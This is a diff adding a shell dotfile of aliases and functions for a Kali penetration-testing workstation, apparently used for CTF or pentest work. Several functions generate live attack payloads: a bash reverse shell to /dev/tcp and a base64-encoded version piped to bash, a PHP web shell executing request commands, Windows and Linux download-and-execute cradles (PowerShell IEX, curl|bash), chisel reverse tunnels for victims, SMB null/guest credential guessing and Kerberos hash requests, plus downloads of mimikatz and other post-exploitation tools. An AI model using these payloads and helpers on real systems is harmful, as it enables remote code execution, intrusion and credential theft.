@@ -1,0 +1,462 @@
+#!/bin/sh
+alias burpsuite="burpsuite &"
+alias ff="firefox > /dev/null 2> /dev/null &"
+alias zaproxy="zaproxy > /dev/null 2> /dev/null &"
+alias eeh="sudoedit /etc/hosts" # Edit /Etc/Host
+alias genssh="ssh-keygen -f id_rsa -P ''"
+alias sco="cat /home/kali/hhb/helper/commands.txt" # Search COmmands
+alias e="nvim"
+alias f="ranger"
+alias history="history 0"
+alias ls="lsd"
+alias lsa="ls -lah"
+alias md="mkdir -p"
+alias aff="jq -r '.results[] | [.status, .url, .resultfile] | @tsv' ./summary.json" # Analyse FFuf
+alias rrm="rm -r"
+alias cssh="ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
+alias ghi="/home/kali/hhb/helper/ghidra.py --temp"
+alias ftpserver="/home/kali/hhb/helper/ftpserver.sh"
+alias share="/home/kali/hhb/helper/webserver.py"
+alias pel="cat /home/kali/hhb/helper/ollinux.txt"
+alias pew="cat /home/kali/hhb/helper/ol-win-local.txt"
+
+# Edit COmmand
+eco() {
+  tmp_file="$(mktemp)"
+  [ ! -t 0 ] && while read -r line; do echo "$line" >> "$tmp_file"; done
+  $EDITOR "$tmp_file"
+  [ ! "$?" = "0" ] && echo "Aborting...Command will not be executed." && rm "$tmp_file" && return
+  echo "Executing:"
+  cat "$tmp_file"
+  . "$tmp_file"
+  rm "$tmp_file"
+}
+
+# Edit HIstory
+ehi() {
+  sel="$(history | fzf | awk '{ print $1 }')"
+  [ "$sel" = "" ] && echo "Nothing selected." && return
+  fc "$sel"
+}
+
+# Copy External File
+cef() {
+  dest="$1"
+  [ "$1" = "" ] && dest="$(pwd)"
+  files="$({ find /opt/external -not -iwholename '*.git*' -type f; cat "$HOME/hhb/helper/files.txt"; } | fzf -m)"
+  echo "$files" | while read -r f; do
+    if [ -f "$f" ]; then
+      file_name="$(basename "$f")"
+      cp "$f" "$dest/$file_name"
+      echo "$f copied to $dest/$file_name"
+    fi
+  done
+}
+
+interfaceip() {
+  interfaces="$(ip -4 -o addr | awk '{print sprintf("%s %s", $2, $4)}')"
+  wlan="$(echo "$interfaces" | grep -i "wlp")"
+  enp="$(echo "$interfaces" | grep -i "enp")"
+  eth="$(echo "$interfaces" | grep -i "eth")"
+  tun="$(echo "$interfaces" | grep -i "tun")"
+  [ "$wlan" != "" ] && address="$(echo "$wlan" | cut -d " " -f 2 | cut -d "/" -f 1)"
+  [ "$enp" != "" ] && address="$(echo "$enp" | cut -d " " -f 2 | cut -d "/" -f 1)"
+  [ "$eth" != "" ] && address="$(echo "$eth" | cut -d " " -f 2 | cut -d "/" -f 1)"
+  [ "$tun" != "" ] && address="$(echo "$tun" | cut -d " " -f 2 | cut -d "/" -f 1)"
+  echo "$address"
+}
+
+getopenport() {
+  from="$1"
+  [ "$1" = "" ] && from="11111"
+  to="$2"
+  [ "$2" = "" ] && to="65535"
+  listing_port="$(ss -tnlH4 | awk '{split($4,a,":"); print a[2]}')"
+  seq "$from" "$to" | shuf | while read -r port; do
+    if ! echo "$listing_port" | grep -xqE "^${port}\$"; then
+      echo "$port" && return
+    fi
+  done
+  echo "No open port found"
+}
+
+# Download from CUrrent dir
+dcu() {
+  [ "$1" = "" ] && echo "Usage: dcu <win/lin> [<port> (defaule 8000)]" && return
+  port="8000"
+  [ "$2" != "" ] && port="$2"
+  address="$(interfaceip)"
+  find . -type f | cut -c 3- | while read -r f; do
+    file_name="$(basename "$f")"
+    echo "#### $f ####"
+    if [ "$1" = "win" ]; then
+      echo "certutil -urlcache -split -f \"http://$address:$port/$f\" $file_name"
+      echo "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://$address:$port/$f','$file_name')\""
+      echo "powershell -c \"wget 'http://$address:$port/$f' -outfile $file_name\" -UseBasicParsing"
+      echo "powershell IEX (New-Object Net.WebClient).DownloadString(\'http://$address:$port/$f\')"
+      echo "curl \"http://$address:$port/$f\" -outputfile $file_name"
+      echo "wget http://$address:$port/$f -outputfile $file_name"
+      echo "Invoke-WebRequest -Uri http://$address:$port/$f -OutFile '$file_name'"
+      echo "Copy-Item -Source \\\\$address\\kali\\$f -Destination '$file_name'"
+      echo "copy \\\\$address\\kali\\$f $file_name"
+    fi
+    if [ "$1" = "lin" ]; then
+      echo "wget \"http://$address:$port/$f\""
+      echo "wget -qO- \"http://$address:$port/$f\" | bash"
+      echo "curl \"http://$address:$port/$f\" | bash"
+      echo "curl $address:$port/$f | bash"
+      echo "curl -o '$file_name' $address:$port/$f"
+      echo "python -c \"import urllib; print urllib.urlopen('http://$address:$port/$f').read()\" > \"$file_name\""
+    fi
+    echo ""
+  done
+}
+
+# Download from CUrrent dir with Selection
+dcus() {
+  [ "$1" = "" ] && echo "Usage: dcus <win/lin> [<port> (defaule 8000)]" && return
+  port="8000"
+  [ "$2" != "" ] && port="$2"
+  sel="$(dcu "$1" "$port" | fzf)"
+  [ "$sel" = "" ] && echo "Nothing selected." && return
+  echo "Selected and copied to clipboard:"
+  echo "$sel"
+  echo "$sel" | xclip -selection clipboard
+}
+
+# NC Listen
+ncl() {
+  port="5555"
+  [ "$1" != "" ] && port="$1"
+  sudo nc -nlvp "$port"
+}
+
+phpwebsh() {
+  printf "%s\n%s\n%s\n%s\n" '<?php' '$output = shell_exec($_REQUEST["cmd"]);' 'echo "<pre>$output</pre>";' '?>'
+  echo "Copied to clipboard."
+  printf "%s\n%s\n%s\n%s\n" '<?php' '$output = shell_exec($_REQUEST["cmd"]);' 'echo "<pre>$output</pre>";' '?>' | xclip -selection clipboard
+}
+
+bashrev() {
+  port="5555"
+  [ "$1" != "" ] && port="$1"
+  address="$(interfaceip)"
+  echo "Payload:"
+  echo "bash -i >& /dev/tcp/$address/$port 0>&1"
+  b64="$(echo "bash -i >& /dev/tcp/$address/$port 0>&1" | base64)"
+  echo "Payload (base64 encoded):"
+  echo "echo '$b64' | base64 -d | bash"
+}
+
+# Port Scan Tcp 
+pst() {
+  [ "$1" = "" ] && echo "Usage: pst <ip>" && return
+  echo "Executing the following command and copied to clipboard:"
+  echo "mkdir -p \"nmap-$1\" && nmap -p- -v -Pn -A -sC -sV --osscan-guess --version-all -oA \"nmap-$1/fullscan-tcp\" \"$1\""
+  echo "mkdir -p \"nmap-$1\" && nmap -p- -v -Pn -A -sC -sV --osscan-guess --version-all -oA \"nmap-$1/fullscan-tcp\" \"$1\"" 
+  mkdir -p "nmap-$1" && nmap -p- -v -Pn -A -sC -sV -sS --osscan-guess --version-all -oA "nmap-$1/fullscan-tcp" "$1"
+  #echo "mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan-tcp"
+  #echo "mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan-tcp" | xclip -selection clipboard
+  #mkdir -p "nmap-$1" && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA "nmap-$1/fullscan-tcp"
+}
+
+# Port Scan Udp
+psu() {
+  [ "$1" = "" ] && echo "Usage: psu <ip>" && return
+  echo "Executing the following command and copied to clipboard:"
+  echo "mkdir -p nmap-$1 && nmap -v -Pn -sU --max-retries 1 --max-scan-delay 1 --version-intensity 0 -oA nmap-$rhost/top1000-udp $1"
+  echo "mkdir -p nmap-$1 && nmap -v -Pn -sU --max-retries 1 --max-scan-delay 1 --version-intensity 0 -oA nmap-$rhost/top1000-udp $1" | xclip -selection clipboard
+  mkdir -p "nmap-$1" && nmap -v -Pn -sU --max-retries 1 --max-scan-delay 1 --version-intensity 0 -oA "nmap-$rhost/top1000-udp" "$1"
+}
+
+# NIKto
+nik() {
+  [ "$3" = "" ] && echo "Usage: nik <http/https> <domain/ip> <port>" && return
+  echo "Executing and copied to clipboard:"
+  echo "nikto -ask=no -h $1://$2:$3 | tee nikto-$1-$2-$3.txt"
+  echo "nikto -ask=no -h $1://$2:$3 | tee nikto-$1-$2-$3.txt" | xclip -selection clipboard
+  nikto -ask=no -h "$1://$2:$3" | tee "nikto-$1-$2-$3.txt"
+}
+
+# Set RHost
+srh() {
+  export rhost="$1"
+  echo "rhost is $rhost"
+}
+
+# FFuf Web bruteforce
+ffw() {
+  [ "$3" = "" ] && echo "Usage: ffw <http/https> <domain/ip> <:port/dir> [other ffuf params]" && return
+  proto="$1"
+  ressource="$2"
+  port="$3"
+  shift; shift; shift;
+  ffuf_out="ffuf-${proto}-${ressource}-${port}"
+  echo "Executing and copied to clipboard:"
+  echo "ffuf -c -u \"${proto}://${ressource}${port}/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o '$ffuf_out/summary.json' -recursion -e '/,.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od '$ffuf_out' -mc '200,204,301,302,307,401,405,403' -H \"Host: ${ressource}\" $@"
+  echo "ffuf -c -u \"${proto}://${ressource}${port}/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o '$ffuf_out/summary.json' -recursion -e '/,.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od '$ffuf_out' -mc '200,204,301,302,307,401,405,403' -H \"Host: ${ressource}\" $@" | xclip -selection clipboard 
+  ffuf -c -u "${proto}://${ressource}${port}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o "$ffuf_out/summary.json" -recursion -e '/,.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od "$ffuf_out" -mc '200,204,301,302,307,401,405,403' -H "Host: ${ressource}" $@
+}
+
+# FFuf Vhost bruteforce
+ffv() {
+  [ "$3" = "" ] && echo "Usage: ffv <http/https> <domain> <:port/dir> <filter_size> [other ffuf params]" && return
+  [ "$4" = "" ] && 4="99999999"
+  proto="$1"
+  ressource="$2"
+  port="$3"
+  filter_size="$4"
+  shift; shift; shift; shift;
+  ffuf_out="ffuf-vhost-${proto}-${ressource}-${port}"
+  echo "Executing and copied to clipboard:"
+  echo "ffuf -c -u \"${proto}://${ressource}${port}\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o '$ffuf_out/summary.json' -od '$ffuf_out' -H \"Host: FUZZ.${ressource}\" -fs ${filter_size} $@"
+  echo "ffuf -c -u \"${proto}://${ressource}${port}\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o '$ffuf_out/summary.json' -od '$ffuf_out' -H \"Host: FUZZ.${ressource}\" -fs ${filter_size} $@" | xclip -selection clipboard
+  ffuf -c -u "${proto}://${ressource}${port}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o "'$ffuf_out/summary.json'" -od "$ffuf_out" -H "Host: FUZZ.${ressource}" -fs ${filter_size} $@
+}
+
+# FFuf Request file
+ffr() {
+  [ "$2" = "" ] && echo "Usage: ffw <http/https> <request-file> [other ffuf params]" && return
+  proto="$1"
+  request_file="$2"
+  shift; shift;
+  ffuf_out="ffuf-${proto}-${request_file}"
+  echo "Executing and copied to clipboard:"
+  echo "ffuf -c -u -request \"${request_file}\" -request-proto \"${proto}\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o '$ffuf_out/summary.json' -recursion -e '/,.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od '$ffuf_out' -mc '200,204,301,302,307,401,405,403' -H \"Host: ${ressource}\" $@"
+  echo "ffuf -c -u -request \"${request_file}\" -request-proto \"${proto}\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o '$ffuf_out/summary.json' -recursion -e '/,.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od '$ffuf_out' -mc '200,204,301,302,307,401,405,403' -H \"Host: ${ressource}\" $@" | xclip
+  ffuf -c -u -request "${request_file}" -request-proto "${proto}" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o "'$ffuf_out/summary.json'" -recursion -e '/,.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od "'$ffuf_out'" -mc '200,204,301,302,307,401,405,403' -H "Host: ${ressource}" $@
+}
+
+# FFuf Directory
+ffd() {
+  [ "$3" = "" ] && echo "Usage: ffw <http/https> <domain/ip> <:port/dir> [other ffuf params]" && return
+  proto="$1"
+  ressource="$2"
+  port="$3"
+  shift; shift; shift;
+  ffuf_out="ffuf-${proto}-${ressource}-${port}"
+  echo "Executing and copied to clipboard:"
+  echo "ffuf -c -u \"${proto}://${ressource}${port}/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o '$ffuf_out/summary.json' -e '/' -od '$ffuf_out' -mc '200,204,301,302,307,401,405,403' -H \"Host: ${ressource}\" $@"
+  echo "ffuf -c -u \"${proto}://${ressource}${port}/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o '$ffuf_out/summary.json' -e '/' -od '$ffuf_out' -mc '200,204,301,302,307,401,405,403' -H \"Host: ${ressource}\" $@" | xclip -selection clipboard 
+  ffuf -c -u "${proto}://${ressource}${port}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o "$ffuf_out/summary.json" -e '/' -od "$ffuf_out" -mc '200,204,301,302,307,401,405,403' -H "Host: ${ressource}" $@
+}
+
+vnc_start() {
+  echo "Starting vnc"
+  (x11vnc -nopw -N -forever -env FD_PROG=startxfce4 -create \
+      -gone 'killall Xvfb' -env X11VNC_CREATE_GEOM="${1:-1024x1080x24}" \
+      -env X11VNC_FINDDISPLAY_ALWAYS_FAILS=1 > /dev/null 2>&1 &)
+  (/usr/share/novnc/utils/launch.sh > /dev/null 2>&1 &)
+  echo "Visit http://kali-docker:6080/vnc.html"
+}
+
+vnc_stop() {
+  echo "Stopping vnc"
+  (pkill websockify > /dev/null 2>&1)
+  (pkill x11vnc > /dev/null 2>&1)
+}
+
+# Encode URl
+eur() {
+  [ "$1" != "" ] && python3 -c "import sys, urllib.parse as ul; print (ul.quote_plus(sys.argv[1]))" "$1"
+}
+
+# Encode URl with Slash
+eurs() {
+  [ "$1" != "" ] && python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read()[0:-1], \"\"))" "$1"
+}
+
+# Decode URl
+dur() {
+  [ "$1" != "" ] && python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))" "$1"
+}
+
+update_external_tools() {
+  wget -O /tmp/chisel_linux64.gz "$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep 'chisel_.*_linux_amd64')" && gunzip /tmp/chisel_linux64.gz && mv /tmp/chisel_linux64 /opt/external && \
+  wget -O /tmp/chisel_linux86.gz "$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep 'chisel_.*_linux_386')" && gunzip /tmp/chisel_linux86.gz && mv /tmp/chisel_linux86 /opt/external && \
+  wget -O /tmp/chisel_win64.gz "$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep 'chisel_.*_windows_amd64')" && gunzip /tmp/chisel_win64.gz && mv /tmp/chisel_win64 /opt/external/chisel_win64.exe && \
+  wget -O /tmp/chisel_win86.gz "$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep 'chisel_.*_windows_386')" && gunzip /tmp/chisel_win86.gz && mv /tmp/chisel_win86 /opt/external/chisel_win86.exe && \
+  wget -O /opt/external/pspy32 "$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest | jq -r '.assets[].browser_download_url' | grep 'pspy32$')" && \
+  wget -O /opt/external/pspy32s "$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest | jq -r '.assets[].browser_download_url' | grep 'pspy32s')" && \
+  wget -O /opt/external/pspy64 "$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest | jq -r '.assets[].browser_download_url' | grep 'pspy64$')" && \
+  wget -O /opt/external/pspy64s "$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest | jq -r '.assets[].browser_download_url' | grep 'pspy64s')" && \
+  wget -O /opt/external/linpeas.sh "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'linpeas.sh')" && \
+  wget -O /opt/external/linpeas_linux_386 "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'linpeas_linux_386')" && \
+  wget -O /opt/external/linpeas_linux_amd64 "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'linpeas_linux_amd64')" && \
+  wget -O /opt/external/winPEAS.bat "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEAS.bat')" && \
+  wget -O /opt/external/winPEASany.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASany.exe')" && \
+  wget -O /opt/external/winPEASany_ofs.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASany_ofs.exe')" && \
+  wget -O /opt/external/winPEASx64.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASx64.exe')" && \
+  wget -O /opt/external/winPEASx64_ofs.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASx64_ofs.exe')" && \
+  wget -O /opt/external/winPEASx86.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASx86.exe')" && \
+  wget -O /opt/external/winPEASx86_ofs.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASx86_ofs.exe')" && \
+  wget -O /tmp/sysint.zip 'https://download.sysinternals.com/files/SysinternalsSuite.zip' && unzip /tmp/sysint.zip -d /opt/external && rm /opt/external/*.chm /opt/external/*.txt /tmp/sysint.zip && \
+  mkdir /tmp/mimi && wget -O /tmp/mimi/mimikatz.zip "$(curl -s https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest | jq -r '.assets[].browser_download_url' | grep 'mimikatz_.*.zip')" && \
+  unzip /tmp/mimi/mimikatz.zip && cp /tmp/mimi/Win32/mimikatz.exe /opt/external/mimikatz32.exe && cp /tmp/mimi/Win32/mimilove.exe /opt/external/mimilove.exe && cp /tmp/mimi/x64/mimikatz.exe /opt/external/mimikatz64.exe && rm -rf /tmp/mimi && \
+  wget -O /opt/external/traitor-386 "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep 'traitor-386')" && \
+  wget -O /opt/external/traitor-amd64 "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep 'traitor-amd64')" && \
+  wget -O /opt/external/SharpWeb.exe "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep '.*.exe')" && \
+  mkdir -p /opt/external/SharpCollection && git clone https://github.com/Flangvik/SharpCollection /opt/external/SharpCollection &&
+  wget -O /opt/external/PrivescCheck.ps1 https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 &&
+  wget -O /opt/external/SharpHound.exe https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
+}
+
+update_repos() {
+  curr_dir="$PWD"
+  find /opt/repos -maxdepth 1 -type d | tail -n +2 | xargs -I {} sh -c 'cd "{}" && git pull'
+}
+
+smbserver() {
+  port="445"
+  [ "$1" != "" ] && port="$1"
+  echo "Starting SMB Server on $port..."
+  echo "No authentication is needed and share name is 'kali'"
+  echo "If no authentication is blocked, use ssmbserver"
+  sudo impacket-smbserver -smb2support -password '' kali "$PWD"
+}
+
+ssmbserver() {
+  port="445"
+  [ "$1" != "" ] && port="$1"
+  ip="$(interfaceip)"
+  echo "Starting secure SMB Server on $port..."
+  echo "Authenticate with this credentials: user:pass"
+  echo "Share name is 'kali'"
+  echo "Example usage: net use z: \\\\\\$ip\kali /user:user pass"
+  sudo impacket-smbserver -smb2support -username user -password 'pass' kali "$PWD"
+}
+
+# Search Hacking Book
+shb() {
+  repo_path="/opt/repos/hacking-handbook"
+  search="$1"
+  [ "$search" = "" ] && search=".*"
+  [ "$2" = "stdout" ] && rg "$search" "$repo_path" && return
+
+  selection="$(rg "$search" "$repo_path" | fzf)"
+  echo "Copied to clipboard:"
+  echo "$selection"
+  echo "$selection" | xclip -selection clipboard
+}
+
+# CHIsel connection
+chi() {
+  [ "$1" = "" ] && echo "Usage: chi <port from victim>" && return
+  rport="$1"
+  lhost_port="9999"
+  address="$(interfaceip)"
+  free_port="$(getopenport)"
+  echo "####### Setup #######"
+  echo "mkdir -p www && cd www && cef && dcus"
+  echo ""
+  echo "####### Start chisel client on windows #######"
+  echo "chisel_win64.exe client ${address}:${lhost_port} R:${rport}:localhost:${free_port}"
+  echo ""
+  echo "####### Start chisel client on linux #######"
+  echo "chmod +x chisel_linux64 && ./chisel_linux64 client ${address}:${lhost_port} R:${rport}:localhost:${free_port}"
+  echo ""
+  if ! pgrep "chisel" > /dev/null ; then
+    echo "####### Starting server... #######"
+    chisel server -p "${lhost_port}" --host 0.0.0.0 --reverse
+  else
+    echo "####### Server already running... #######"
+  fi
+}
+
+# Python Virtual Env
+pve() {
+  [ "$1" = "" ] && echo "Usage: pve <virtual env name>" && return
+  python3 -m venv "$1"
+  . "$1/bin/activate"
+  echo 'Run "deactivate" to exit virtual env'
+}
+
+# CRack Hash
+crh() {
+  [ "$1" = "" ] && echo "Usage: cha <path to file with hash>" && return
+  nth --no-banner --file "$1"
+  echo "Crack with hashcat:"
+  echo "hashcat \"$1\" /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
+}
+
+enumsmb() {
+	[ "$1" = "" ] && echo "Usage: enumsmb <ip> [domain]" && return
+	users=",nobody,admin,administrator,root,guest,null,anonymous"
+	echo "########### Running: nbtscan \"$1\" ###########"
+	nbtscan "$1"
+	echo "########### Running: smbmap -H \"$1\" ###########"
+	smbmap -H "$1"
+	echo "########### Running: smbmap -H \"$1\" -u null -p null ###########"
+	smbmap -H "$1" -u null -p null
+	echo "########### Running: smbmap -H \"$1\" -u guest ###########"
+	smbmap -u guest -H "$1"
+	echo "########### Running: crackmapexec smb \"$1\" ###########"
+	crackmapexec smb "$1"
+	echo "########### Running: rpcclient -U '' -N -c 'querydispinfo' \"$1\" ###########"
+	rpcclient -U '' -N -c 'querydispinfo' "$1"
+	echo "$users" | tr "," "\n" | xargs -I '{}' sh -c \
+		"echo \"########### Running: smbmap -u '{}' -p '' -H \"$1\" ###########\"; \
+    smbmap -u '{}' -p '' -H \"$1\"; \
+    echo \"########### Running: smbmap -u '{}' -p '{}' -H \"$1\" ###########\"; \
+    smbmap -u '{}' -p '{}' -H \"$1\"; \
+    echo \"########### Running: crackmapexec smb \"$1\" --pass-pol -u '{}' -p '' ###########\"; \
+    crackmapexec smb \"$1\" --pass-pol -u '{}' -p '' 2>/dev/null; \
+    echo \"########### Running: crackmapexec smb \"$1\" --pass-pol -u '{}' -p '{}' ###########\"; \
+    crackmapexec smb \"$1\" --pass-pol -u '{}' -p '{}' 2>/dev/null; \
+    echo \"########### Running: echo '' | rpcclient -U '{}' -c 'querydispinfo' \"$1\" ###########\"; \
+    echo '' | rpcclient -U '{}' -c 'querydispinfo' \"$1\"
+    echo \"########### Running: echo '{}' | rpcclient -U '{}' -c 'querydispinfo' \"$1\" ###########\"; \
+    echo '{}' | rpcclient -U '{}' -c 'querydispinfo' \"$1\""
+	echo "########### Running: smbclient -N -L //\"$1\" ###########"
+	smbclient -N -L //"$1"
+	echo "########### Running: smbclient -N //\"$1\"/ --option=\"client min protocol\"=LANMAN1 ###########"
+	smbclient -N //"$1"/ --option="client min protocol"=LANMAN1
+	echo "########### Running: impacket-getArch -target \"$1\" ###########"
+	impacket-getArch -target "$1"
+	echo "########### Running: enum4linux-ng.py -a \"$1\" ###########"
+	enum4linux-ng.py -A "$1"
+	echo "########### Running: nmap --script \"smb-enum* or smb-vuln*\" -Pn -p 139,445 \"$1\" ###########"
+	nmap --script "smb-enum* or smb-vuln*" -Pn -p 139,445 "$1"
+	if [ ! "$2" = "" ]; then
+		echo "########### Running: impacket-GetADUsers -dc-ip \"$1\" \"$2/\" -all ###########"
+		impacket-GetADUsers -dc-ip "$1" "$2/" -all
+		echo "########### Running: impacket-GetNPUsers -dc-ip \"$1\" -request \"$2/\" -format hashcat ###########"
+		impacket-GetNPUsers -dc-ip "$1" -request "$2/" -format hashcat
+		echo "########### Running: impacket-GetUserSPNs -dc-ip \"$1\" -request \"$2/\" ###########"
+		impacket-GetUserSPNs -dc-ip "$1" -request "$2/"
+	fi
+	echo "########### Auto Enum down ###########"
+	echo "Do you want to bruteforce via SMB?"
+	echo "crackmapexec smb \"$1\" -u pot-user.txt -p pot-passwords.txt --continue-on-success"
+}
+
+# BloodHound
+bh() {
+	echo "Setting neo4j credentials to: neo4j:pass"
+	sudo /usr/share/neo4j/bin/neo4j-admin set-initial-password pass >/dev/null 2>/dev/null && sudo neo4j console >/dev/null &
+	echo "Waiting 10 seconds for neo4j to start up in the background..."
+	echo "When you close bloodhound neo4j will be closed automaticly after a few seconds..."
+	sleep 10
+	echo "Starting bloodhound..."
+	bloodhound >/dev/null 2>/dev/null
+	echo "Stopping neo4j..."
+	sudo kill "$(pgrep -f -n -i 'neo4j')"
+	echo "Done stopping neo4j!"
+}
+
+# SearchsPloit
+sp() {
+  selected="$(searchsploit -o --color "$*" | fzf --tac)"
+  file_name="$(echo "$selected" | awk -F '/' '{print $NF}')"
+  ebdid="$(echo "$file_name" | cut -d '.' -f1)"
+  [ "$ebdid" = "" ] && return 1
+  searchsploit -m "$ebdid"
+}
+
+# MSFConsole
+msfc() {
+  if ! sudo service postgresql status | grep -oq online; then 
+    sudo service postgresql start
+  fi
+  msfconsole -q
+}
